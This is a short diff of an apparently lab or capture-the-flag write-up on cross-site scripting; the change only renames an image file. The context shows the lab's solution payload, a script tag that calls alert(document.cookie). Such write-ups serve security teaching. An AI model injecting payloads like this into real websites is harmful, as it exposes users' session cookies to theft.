@@ -8,6 +8,6 @@ To solve this lab we just have to use the following payload: &#x20;
 <script>alert(document.cookie)</script>
 ```
 
-<figure><img src="../../../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (23) (1).png" alt=""><figcaption></figcaption></figure>
 
 And a pop appears with the flag!
